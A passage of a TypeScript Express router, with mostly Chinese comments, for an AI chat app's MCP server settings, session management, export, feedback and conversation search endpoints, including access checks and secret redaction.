   * 非 user 作用域必须给出 workspacePath,而且必须过归属门。
   *
   * MCP provider 的 `resolveWorkspacePath` 在没给时回落到 `process.cwd()`(服务进程自己的工作目录),
   * scope 又默认 `'project'`;不拦的话,任何登录用户不带这两个参数就能往 Prism 安装目录里写
   * `.mcp.json`,而 MCP server 配置决定这段对话能调用哪些外部进程。
   *
   * 明确拒绝而不是替它挑一个默认值:猜错默认值的代价是往错误的地方写配置,
   * 而调用方本来就知道自己在操作哪个项目。
   */
  const normalizedWorkspacePath = typeof workspacePath === 'string' ? workspacePath.trim() : '';
  if (!normalizedWorkspacePath) {
    throw new AppError('缺少 workspacePath —— 项目级 MCP 配置必须说明是哪个项目', {
      code: 'WORKSPACE_PATH_REQUIRED',
      statusCode: 400,
    });
  }
  await assertViewerMayCreateSessionAt(readRequestViewer(req), normalizedWorkspacePath);
}

// ----------------- MCP routes -----------------
router.get(
  '/:provider/mcp/servers',
  asyncHandler(async (req: Request, res: Response) => {
    const provider = parseProvider(req.params.provider);
    const workspacePath = readOptionalQueryString(req.query.workspacePath);
    const scope = parseMcpScope(req.query.scope);
    await assertMayReadMcpScope(req, scope, workspacePath);
    const isRoot = Boolean(req.user?.isRoot);

    if (scope) {
      const servers = await providerMcpService.listProviderMcpServersForScope(provider, scope, { workspacePath });
      res.json(createApiSuccessResponse({
        provider,
        scope,
        servers: shouldRedactScope(scope, isRoot) ? redactMcpSecretsInList(servers) : servers,
      }));
      return;
    }

    /*
     * 不带 scope 时三组一起返回,其中含 `user` 作用域(`~/.claude.json`,全机配置,
     * `env`/`headers` 里是 API key 与 bearer token)。按作用域逐组决定要不要打码,
     * 和显式 scope 那条路同一套规则。
     */
    const groupedServers = await providerMcpService.listProviderMcpServers(provider, { workspacePath });
    const scopes = Object.fromEntries(
      Object.entries(groupedServers).map(([groupScope, servers]) => [
        groupScope,
        shouldRedactScope(groupScope, isRoot) ? redactMcpSecretsInList(servers) : servers,
      ]),
    );
    res.json(createApiSuccessResponse({ provider, scopes }));
  }),
);

router.post(
  '/:provider/mcp/servers',
  asyncHandler(async (req: Request, res: Response) => {
    const provider = parseProvider(req.params.provider);
    const payload = parseMcpUpsertPayload(req.body);
    await assertMayTouchMcpScope(req, payload.scope, payload.workspacePath);
    const server = await providerMcpService.upsertProviderMcpServer(provider, payload);
    res.status(201).json(createApiSuccessResponse({ server }));
  }),
);

router.delete(
  '/:provider/mcp/servers/:name',
  asyncHandler(async (req: Request, res: Response) => {
    const provider = parseProvider(req.params.provider);
    const scope = parseMcpScope(req.query.scope);
    const workspacePath = readOptionalQueryString(req.query.workspacePath);
    await assertMayTouchMcpScope(req, scope, workspacePath);
    const result = await providerMcpService.removeProviderMcpServer(provider, {
      name: readPathParam(req.params.name, 'name'),
      scope,
      workspacePath,
    });
    res.json(createApiSuccessResponse(result));
  }),
);

router.get(
  '/capabilities',
  asyncHandler(async (_req: Request, res: Response) => {
    res.json(createApiSuccessResponse({
      providers: providerCapabilitiesService.listAllProviderCapabilities(),
    }));
  }),
);

router.get(
  '/:provider/capabilities',
  asyncHandler(async (req: Request, res: Response) => {
    const provider = parseProvider(req.params.provider);
    res.json(createApiSuccessResponse(
      providerCapabilitiesService.getProviderCapabilities(provider),
    ));
  }),
);

// ----------------- Session routes -----------------
/**
 * Session gateway entry point: allocates the stable app-facing session id for
 * a brand-new chat. The frontend must call this before the first `chat.send`
 * so the session id in the URL, the store, and the websocket all agree from
 * the very first message — there is no client-visible session-id handoff.
 */
router.post(
  '/sessions',
  asyncHandler(async (req: Request, res: Response) => {
    const body = (req.body ?? {}) as Record<string, unknown>;
    const provider = parseProvider(body.provider);
    const projectPath = typeof body.projectPath === 'string' ? body.projectPath : '';
    // 路径合法(挡越界)+ 项目可见(挡越权),与任务路由同一道门。
    // 没有它,任何登录用户 POST 一个 projectPath:"/" 就成了根目录项目的 owner,
    // 文件树、聊天 cwd 随之全盘放开。见 session-project-path-guard。
    await assertViewerMayCreateSessionAt(readRequestViewer(req), projectPath);
    // 建会话的人成为新项目的 owner(项目已存在时 owner 不变)。不传的话新项目就是无主的:
    // 不在公共目录下时连创建者自己都看不见,在公共目录下则所有人都看得见。
    const ownerUserId = typeof req.user?.id === 'number' ? req.user.id : null;
    const result = sessionsService.createAppSession(provider, projectPath, ownerUserId);
    res.status(201).json(createApiSuccessResponse(result));
  }),
);

router.get(
  '/sessions/running',
  asyncHandler(async (req: Request, res: Response) => {
    const sessions = sessionsService.listRunningSessions(readRequestViewer(req));
    res.json(createApiSuccessResponse({ sessions }));
  }),
);

router.get(
  '/sessions/archived',
  asyncHandler(async (req: Request, res: Response) => {
    // 分页 + 可见性下推 SQL。`sessions` 是这一页的数组;total/hasMore 让界面能说清
    // "还有多少条没列出来"。
    const page = sessionsService.listArchivedSessions(readRequestViewer(req), {
      limit: parseOptionalCountQuery(req.query.limit, 'limit'),
      offset: parseOptionalCountQuery(req.query.offset, 'offset'),
    });
    res.json(createApiSuccessResponse(page));
  }),
);

/**
 * 批量归档 / 恢复 / 删除。逐条鉴权(看不见的、看得见但无权操作的都静默跳过,不报错 —— 报错等于
 * 告诉调用方那个 id 存在),一条失败不中断其余,最后给一份账。
 *
 * 放在 `/sessions/:sessionId` 之前:否则 `bulk` 会被当成一个 sessionId。
 */
router.post(
  '/sessions/bulk',
  asyncHandler(async (req: Request, res: Response) => {
    const body = (req.body ?? {}) as Record<string, unknown>;
    const action = typeof body.action === 'string' ? body.action : '';
    if (action !== 'archive' && action !== 'restore' && action !== 'delete') {
      throw new AppError('action must be archive, restore or delete', {
        code: 'INVALID_BULK_ACTION',
        statusCode: 400,
      });
    }

    const ids = Array.isArray(body.sessionIds)
      ? body.sessionIds.filter((value): value is string => typeof value === 'string' && value.trim().length > 0)
      : [];
    // 上限只是防手滑/防滥用:一次几千条会让请求跑很久且没有进度可言。
    if (ids.length === 0 || ids.length > 500) {
      throw new AppError('sessionIds must contain 1 to 500 ids', {
        code: 'INVALID_BULK_IDS',
        statusCode: 400,
      });
    }

    const result = await sessionsService.bulkSessionAction(ids, action, readRequestViewer(req), {
      actor: readSessionActor(req),
    });
    res.json(createApiSuccessResponse(result));
  }),
);

/**
 * 清空归档:永久删除当前访问者看得见的归档会话(进最近删除;看得见但无权永久删除的跳过并计数)。
 * `?olderThanDays=N` 只清超过 N 天的(给"保留最近一周"这种用法)。
 */
router.delete(
  '/sessions/archived',
  asyncHandler(async (req: Request, res: Response) => {
    const olderThanDays = parseOptionalCountQuery(req.query.olderThanDays, 'olderThanDays');
    const result = await sessionsService.emptyArchivedSessions(readRequestViewer(req), {
      olderThanDays,
      actor: readSessionActor(req),
    });
    res.json(createApiSuccessResponse(result));
  }),
);

/**
 * 最近删除(会话回收站)。放在 `/sessions/:sessionId` 之前,否则 `trash` 会被当成一个 sessionId。
 *   GET    /sessions/trash                 列表(分页,最近删的在前)
 *   POST   /sessions/trash/:id/restore     恢复(root / 项目 owner / 删除者)
 *   DELETE /sessions/trash/:id             立即清除(root)
 */
router.get(
  '/sessions/trash',
  asyncHandler(async (req: Request, res: Response) => {
    const page = sessionsService.listTrashedSessions(readRequestViewer(req), {
      limit: parseOptionalCountQuery(req.query.limit, 'limit'),
      offset: parseOptionalCountQuery(req.query.offset, 'offset'),
    });
    res.json(createApiSuccessResponse(page));
  }),
);

router.post(
  '/sessions/trash/:sessionId/restore',
  asyncHandler(async (req: Request, res: Response) => {
    const sessionId = parseSessionId(req.params.sessionId);
    const result = await sessionsService.restoreTrashedSession(sessionId, readRequestViewer(req), readSessionActor(req));
    res.json(createApiSuccessResponse(result));
  }),
);

router.delete(
  '/sessions/trash/:sessionId',
  asyncHandler(async (req: Request, res: Response) => {
    assertRootForTrashPurge(req);
    const sessionId = parseSessionId(req.params.sessionId);
    const result = await sessionsService.purgeTrashedSession(sessionId, readSessionActor(req));
    res.json(createApiSuccessResponse(result));
  }),
);

router.delete(
  '/sessions/:sessionId',
  asyncHandler(async (req: Request, res: Response) => {
    const sessionId = parseSessionId(req.params.sessionId);
    const viewer = readRequestViewer(req);
    sessionsService.assertViewerCanSeeSession(sessionId, viewer);
    const force = parseOptionalBooleanQuery(req.query.force, 'force') ?? false;
    // 永久删除与归档 / 还原同一道门(canViewerManageSession:root、项目 owner、会话发起人),
    // 403 的说明按动作分开写。
    if (force) sessionsService.assertViewerMayPermanentlyDelete(sessionId, viewer);
    else sessionsService.assertViewerMayArchiveOrRestore(sessionId, viewer, 'archive');
    const deletedFromDisk = parseOptionalBooleanQuery(req.query.deletedFromDisk, 'deletedFromDisk') ?? force;
    const result = await sessionsService.deleteOrArchiveSessionById(sessionId, {
      force,
      deletedFromDisk,
      actor: readSessionActor(req),
      via: 'session',
    });
    res.json(createApiSuccessResponse(result));
  }),
);

router.post(
  '/sessions/:sessionId/restore',
  asyncHandler(async (req: Request, res: Response) => {
    const sessionId = parseSessionId(req.params.sessionId);
    // 还原与归档同一道门。
    sessionsService.assertViewerMayArchiveOrRestore(sessionId, readRequestViewer(req), 'restore');
    const result = sessionsService.restoreSessionById(sessionId);
    res.json(createApiSuccessResponse(result));
  }),
);

router.put(
  '/sessions/:sessionId',
  asyncHandler(async (req: Request, res: Response) => {
    const sessionId = parseSessionId(req.params.sessionId);
    sessionsService.assertViewerCanSeeSession(sessionId, readRequestViewer(req));
    const summary = parseSessionRenameSummary(req.body);
    const result = sessionsService.renameSessionById(sessionId, summary);
    res.json(createApiSuccessResponse(result));
  }),
);

/**
 * 会话导出:?format=md(默认)|html|json,?includeTools=true 带上工具过程。
 * 可见性校验与 messages 同门;全量拉取(limit=null),attachment 直接触发浏览器下载。
 */
router.get(
  '/sessions/:sessionId/export',
  asyncHandler(async (req: Request, res: Response) => {
    const sessionId = parseSessionId(req.params.sessionId);
    sessionsService.assertViewerCanSeeSession(sessionId, readRequestViewer(req));

    const formatRaw = readOptionalQueryString(req.query.format) ?? 'md';
    if (formatRaw !== 'md' && formatRaw !== 'html' && formatRaw !== 'json') {
      throw new AppError('format must be md, html or json', {
        code: 'INVALID_QUERY_PARAMETER',
        statusCode: 400,
      });
    }
    // 默认不带工具过程(多数导出是给人读的);要排查"它当时改了哪个文件"时再打开。
    const includeTools = parseOptionalBooleanQuery(req.query.includeTools, 'includeTools') ?? false;

    const history = await sessionsService.fetchHistory(sessionId, { limit: null, offset: 0 });
    const dbSession = sessionsDb.getSessionById(sessionId);
    const title = (dbSession?.custom_name && String(dbSession.custom_name).trim()) || `会话 ${sessionId.slice(0, 8)}`;

    const rendered = renderSessionExport(
      {
        title,
        sessionId,
        // 原生 id 一起带出去:transcript / 检查点都按它组织。
        providerSessionId: dbSession?.provider_session_id ?? null,
        exportedAt: new Date().toISOString(),
        // 逐字段显式映射,不整条 `as` 强转:强转会让 `toolUseId`/`toolName` 这类字段名
        // 漂移在编译期完全静默(导出里恒为 null)。
        messages: history.messages.map((message): ExportableMessage => ({
          kind: message.kind,
          role: (message as { role?: 'user' | 'assistant' }).role,
          content: message.content,
          timestamp: message.timestamp,
          model: (message as { model?: string }).model,
          toolName: (message as { toolName?: string }).toolName,
          toolInput: (message as { toolInput?: unknown }).toolInput,
          toolId: (message as { toolId?: string }).toolId,
          isError: (message as { isError?: boolean }).isError,
          // 附件清单,取自归一化消息上的 `images` 字段。
          attachments: Array.isArray((message as { images?: unknown[] }).images)
            ? ((message as { images: unknown[] }).images).map((image) => {
              const record = (image && typeof image === 'object' ? image : {}) as Record<string, unknown>;
              return {
                name: typeof record.name === 'string' ? record.name : undefined,
                path: typeof record.path === 'string' ? record.path : undefined,
                mimeType: typeof record.mimeType === 'string' ? record.mimeType : undefined,
              };
            })
            : undefined,
        })),
      },
      formatRaw,
      { includeTools },
    );

    const asciiName = `session-${sessionId.slice(0, 8)}.${rendered.extension}`;
    const utf8Name = encodeURIComponent(`${title}.${rendered.extension}`);
    res.setHeader('Content-Type', rendered.mime);
    res.setHeader(
      'Content-Disposition',
      `attachment; filename="${asciiName}"; filename*=UTF-8''${utf8Name}`,
    );
    res.send(rendered.content);
  }),
);

router.get(
  '/sessions/:sessionId/messages',
  asyncHandler(async (req: Request, res: Response) => {
    const sessionId = parseSessionId(req.params.sessionId);
    sessionsService.assertViewerCanSeeSession(sessionId, readRequestViewer(req));
    const limitRaw = readOptionalQueryString(req.query.limit);
    const offsetRaw = readOptionalQueryString(req.query.offset);

    let limit: number | null = null;
    if (limitRaw !== undefined) {
      const parsedLimit = Number.parseInt(limitRaw, 10);
      if (Number.isNaN(parsedLimit) || parsedLimit < 0) {
        throw new AppError('limit must be a non-negative integer.', {
          code: 'INVALID_QUERY_PARAMETER',
          statusCode: 400,
        });
      }
      limit = parsedLimit;
    }

    let offset = 0;
    if (offsetRaw !== undefined) {
      const parsedOffset = Number.parseInt(offsetRaw, 10);
      if (Number.isNaN(parsedOffset) || parsedOffset < 0) {
        throw new AppError('offset must be a non-negative integer.', {
          code: 'INVALID_QUERY_PARAMETER',
          statusCode: 400,
        });
      }
      offset = parsedOffset;
    }

    const result = await sessionsService.fetchHistory(sessionId, {
      limit,
      offset,
    });
    res.json(createApiSuccessResponse(result));
  }),
);

/** 响应体的摘要,作 work-frames 的强 ETag。 */
function workFramesEtag(body: string): string {
  return `"wf-${createHash('sha1').update(body).digest('base64url')}"`;
}

/**
 * If-None-Match 里有没有这个 ETag(逗号分隔的列表;按弱比较,`W/` 前缀不影响)。
 *
 * 不走 Express 的 `req.fresh`:按 Fetch 规范,浏览器给手动带 If-None-Match 的 fetch 补上
 * `Cache-Control: no-cache`,`fresh` 见到它一律判为过期,304 永远不会发生。这里的 304 只回应
 * 前端显式带来的那个 ETag。
 */
function ifNoneMatchHits(header: string | undefined, etag: string): boolean {
  if (!header) return false;
  return header.split(',').some((entry) => entry.trim().replace(/^W\//, '') === etag);
}

/**
 * 右侧工作面板的数据帧(任务清单 + 产出文件原料)。
 * 全量历史滤出 TodoWrite/TaskCreate/TaskUpdate/Write 工具帧,只带折叠会读的字段;折叠在前端做。
 *
 * 带 ETag(整份响应体的摘要):前端每个回合结束、回滚之后都会重取,带上次的 ETag 来,
 * 内容没变就回 304,不再下发、前端也不再重折。摘要按响应体算而不用显示日志指纹:skillSurveys
 * 跟着反馈记录和个人开关变,老会话走 transcript 回放时也没有日志指纹。
 * `/api` 统一的 `Cache-Control: no-store` 不动:浏览器不缓存这份响应,304 只发给前端自己带着
 * ETag 来问的那一次,不会把缓存里的旧响应头合并回来。
 */
router.get(
  '/sessions/:sessionId/work-frames',
  asyncHandler(async (req: Request, res: Response) => {
    const sessionId = parseSessionId(req.params.sessionId);
    sessionsService.assertViewerCanSeeSession(sessionId, readRequestViewer(req));
    // `truncated`:帧数触顶、较早的帧未下发,前端 useSessionWorkFrames 据此提示。
    // turnOutputs(助手回答 id → 这一轮写出的文件)给对话正文下面的产出卡直接读:由服务端
    // 从全量日志算好、随会话一次到达,不由前端从"当前加载到的窗口"现推(那会随历史补齐而变)。
    const { frames, revertedPaths, truncated, turnOutputs, userTurns } = await sessionsService.fetchWorkFrames(sessionId);
    // 调过 skill 的回合结束后的「效果如何」卡 —— 由服务端按显示日志算,不存"已弹出"状态;
    // 刷新、换设备结果一致。前端每回合结束都会重取这个接口,所以不需要单独的实时帧。
    const skillSurveys = await computeSkillSurveys(sessionId, req);
    const body = JSON.stringify(createApiSuccessResponse({ frames, revertedPaths, turnOutputs, truncated: truncated === true, skillSurveys, userTurns: userTurns ?? 0 }));
    const etag = workFramesEtag(body);
    res.setHeader('ETag', etag);
    if (ifNoneMatchHits(req.headers['if-none-match'], etag)) {
      res.status(304).end();
      return;
    }
    res.type('application/json').send(body);
  }),
);

/** 从账号同步的界面偏好里读「技能效果询问」开关;读不到一律当开着。 */
export function readSkillSurveyEnabled(settings: Record<string, unknown> | null | undefined): boolean {
  const values = (settings as { values?: Record<string, unknown> } | null | undefined)?.values;
  const raw = values?.uiPreferences;
  if (typeof raw !== 'string') return true;
  try {
    const parsed = JSON.parse(raw) as { skillSurveyEnabled?: unknown };
    return parsed?.skillSurveyEnabled !== false && parsed?.skillSurveyEnabled !== 'false';
  } catch {
    return true;
  }
}

/**
 * 效果调查卡的判定入口。显示日志 → 候选(调过 Skill 且我发起的网页回合)→ 抽样与三道闸。
 * 关掉了询问(`user_ui_settings.skillSurveyEnabled === false`)或没登录 → 空。
 */
async function computeSkillSurveys(sessionId: string, req: Request) {
  const viewer = readRequestViewer(req);
  const userId = typeof viewer.userId === 'number' ? viewer.userId : Number(viewer.userId);
  if (!Number.isFinite(userId)) return [];
  // 开关存在账号同步的 `uiPreferences`(localStorage 那份 JSON 串,见 utils/accountSettings.ts):
  // `settings.values.uiPreferences` 是一段 JSON 文本,里面的 `skillSurveyEnabled === false` 才算关。
  const enabled = readSkillSurveyEnabled(uiSettingsDb.get(userId)?.settings);
  const { rate, cooldownMs } = readSurveyConfig();
  if (!enabled || rate <= 0) return [];
  const messages = sessionMessagesDb.listForSession(sessionId);
  const candidates = collectSkillSurveyCandidates(messages, userId);
  if (candidates.length === 0) return [];
  const answered = new Set(messageFeedbackDb.listForSessionAndUser(sessionId, userId).map((row) => row.message_id));
  return decideSkillSurveys(candidates, {
    viewerUserId: userId,
    rate,
    cooldownMs,
    answeredMessageIds: answered,
    lastSurveyAt: (skill) => messageFeedbackDb.lastSurveyAt(userId, skill),
    enabled,
  });
}

/**
 * 用户对一条回答的反馈:点赞 / 点踩(vote)与效果调查卡(survey)。
 *
 * 可见性沿用会话可见性(看得见就能投);一人一条一票,改票 upsert。
 * `project_id` 从会话所属项目取,按项目切数据时不必回表。
 */
const FEEDBACK_MESSAGE_ID = /^[A-Za-z0-9_.:-]{1,200}$/;
const FEEDBACK_CATEGORIES = new Set(['wrong_result', 'not_as_asked', 'wrong_tool', 'too_slow', 'other']);

const parseFeedbackBody = (body: unknown) => {
  const input = (body ?? {}) as Record<string, unknown>;
  const source = input.source === 'survey' ? 'survey' : 'vote';
  const status = input.status === 'dismissed' ? 'dismissed' : 'answered';
  let verdict: number | null = null;
  if (status === 'answered') {
    const raw = Number(input.verdict);
    if (![1, 0, -1].includes(raw)) {
      throw new AppError('verdict 只能是 1(好)/ 0(一般)/ -1(差)', { code: 'INVALID_VERDICT', statusCode: 400 });
    }
    verdict = raw;
  }
  const category = typeof input.category === 'string' && FEEDBACK_CATEGORIES.has(input.category) ? input.category : null;
  const asText = (value: unknown, max: number) => (typeof value === 'string' && value.trim() ? value.trim().slice(0, max) : null);
  // skill_hint 之后会当目录名用(反馈 → 任务集):只认技能名的形状,不像的一律当没有
  const asSkillName = (value: string | null) => (value && /^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/.test(value) && value !== '.' && value !== '..' ? value : null);
  return {
    source: source as 'vote' | 'survey',
    status: status as 'answered' | 'dismissed',
    verdict,
    category,
    note: asText(input.note, 2000),
    expectedOutput: asText(input.expectedOutput ?? input.expected_output, 8000),
    skillHint: asSkillName(asText(input.skillHint ?? input.skill_hint, 128)),
  };
};

const projectIdForSession = (sessionId: string): string | null => {
  const session = sessionsDb.getSessionById(sessionId);
  const projectPath = session?.project_path?.trim();
  if (!projectPath) return null;
  return projectsDb.getProjectPath(projectPath)?.project_id ?? null;
};

router.get(
  '/sessions/:sessionId/feedback',
  asyncHandler(async (req: Request, res: Response) => {
    const sessionId = parseSessionId(req.params.sessionId);
    const viewer = readRequestViewer(req);
    sessionsService.assertViewerCanSeeSession(sessionId, viewer);
    const userId = Number(viewer.userId);
    const rows = Number.isFinite(userId) ? messageFeedbackDb.listForSessionAndUser(sessionId, userId) : [];
    res.json(createApiSuccessResponse({ feedback: rows }));
  }),
);

router.post(
  '/sessions/:sessionId/messages/:messageId/feedback',
  asyncHandler(async (req: Request, res: Response) => {
    const sessionId = parseSessionId(req.params.sessionId);
    const messageId = String(req.params.messageId ?? '');
    if (!FEEDBACK_MESSAGE_ID.test(messageId)) {
      throw new AppError('Invalid messageId.', { code: 'INVALID_MESSAGE_ID', statusCode: 400 });
    }
    const viewer = readRequestViewer(req);
    sessionsService.assertViewerCanSeeSession(sessionId, viewer);
    const userId = Number(viewer.userId);
    if (!Number.isFinite(userId)) {
      throw new AppError('Not authenticated', { code: 'UNAUTHENTICATED', statusCode: 401 });
    }
    const parsed = parseFeedbackBody(req.body);
    /*
     * messageId 必须是这个会话里的一条助手回答,skill 由服务端从这一轮的 Skill 工具帧反查;
     * 客户端自报的值只在服务端查不到时才用(显示日志被裁过 / 老会话)。不核对的话,能看到会话的人
     * 可以给任意技能伪造任意多条评价,污染训练数据。显示日志为空的会话(磁盘发现的老会话)放行:
     * 那类会话本来就不进训练。
     */
    const displayLog = sessionMessagesDb.listForSession(sessionId);
    const target = displayLog.length > 0 ? resolveFeedbackTarget(displayLog, messageId) : null;
    // 日志被裁剪过(最早那批被物理删掉)时,查不到可能只是因为那条回答在被裁掉的前半段 ——
    // 页面是从 transcript 回放出来的,用户照样看得见、点得了点踩。这时不 404,
    // 回落到客户端自报的 skill(与"服务端查不到才用客户端值"的口径一致)。
    if (target && !target.found && !sessionMessagesDb.isTrimmed(sessionId)) {
      throw new AppError('这条消息不属于该会话', { code: 'FEEDBACK_MESSAGE_NOT_IN_SESSION', statusCode: 404 });
    }
    const skillHint = target?.skill ?? parsed.skillHint;
    const row = messageFeedbackDb.upsert({
      sessionId,
      projectId: projectIdForSession(sessionId),
      messageId,
      userId,
      ...parsed,
      skillHint,
    });
    const actor = readSessionActor(req);
    auditLogDb.record({
      userId: typeof actor.userId === 'number' ? actor.userId : Number(actor.userId) || null,
      username: actor.username ?? null,
      event: 'message_feedback',
      detail: `${parsed.source} ${parsed.status}${parsed.verdict === null ? '' : ` verdict=${parsed.verdict}`}${skillHint ? ` skill=${skillHint}` : ''} session=${sessionId}`,
    });
    res.json(createApiSuccessResponse({ feedback: row }));
  }),
);

router.delete(
  '/sessions/:sessionId/messages/:messageId/feedback',
  asyncHandler(async (req: Request, res: Response) => {
    const sessionId = parseSessionId(req.params.sessionId);
    const messageId = String(req.params.messageId ?? '');
    if (!FEEDBACK_MESSAGE_ID.test(messageId)) {
      throw new AppError('Invalid messageId.', { code: 'INVALID_MESSAGE_ID', statusCode: 400 });
    }
    const viewer = readRequestViewer(req);
    sessionsService.assertViewerCanSeeSession(sessionId, viewer);
    const userId = Number(viewer.userId);
    const removed = Number.isFinite(userId) ? messageFeedbackDb.remove(messageId, userId) : false;
    res.json(createApiSuccessResponse({ removed }));
  }),
);

/**
 * 铸一张搜索用的 SSE 票据。
 *
 * EventSource 没法带 Authorization 头,所以前端先用普通(带 Bearer 头的)POST
 * 换一张短命票据,再拿它连 `/search/sessions` —— JWT 不进 URL。
 */
router.post('/search/ticket', (req: Request, res: Response) => {
  const viewer = (req as Request & { user?: { id?: number; token_version?: number | null } }).user;
  if (viewer?.id == null) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  // 带上签发时的 token_version,消费时比对(见 sse-tickets)。
  return res.json({ ticket: issueSseTicket(viewer.id, viewer.token_version ?? 0) });
});

router.get('/search/sessions', asyncHandler(async (req: Request, res: Response) => {
  const query = parseSessionSearchQuery(req.query.q);
  const limit = parseSessionSearchLimit(req.query.limit);

  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    Connection: 'keep-alive',
    'X-Accel-Buffering': 'no',
  });

  let closed = false;
  const abortController = new AbortController();
  req.on('close', () => {
    closed = true;
    abortController.abort();
  });

  try {
    const viewer = (req as Request & { user?: { id?: number; username?: string } }).user;

    await sessionConversationsSearchService.search({
      query,
      limit,
      signal: abortController.signal,
      // Scope the corpus to this account. The results carry conversation
      // snippets, so an unscoped search hands over colleagues' message text.
      viewer: { userId: viewer?.id ?? null, username: viewer?.username ?? null },
      onProgress: ({ projectResult, totalMatches, scannedProjects, totalProjects }) => {
        if (closed) {
          return;
        }

        if (projectResult) {
          res.write(`event: result\ndata: ${JSON.stringify({ projectResult, totalMatches, scannedProjects, totalProjects })}\n\n`);
          return;
        }

        res.write(`event: progress\ndata: ${JSON.stringify({ totalMatches, scannedProjects, totalProjects })}\n\n`);
      },
    });

    if (!closed) {
      res.write('event: done\ndata: {}\n\n');
    }
  } catch (error) {
    log.error('Error searching conversations:', error);
    if (!closed) {
      res.write(`event: error\ndata: ${JSON.stringify({ error: 'Search failed' })}\n\n`);
    }
  } finally {
    if (!closed) {
      res.end();
    }
  }
}));

export default router;
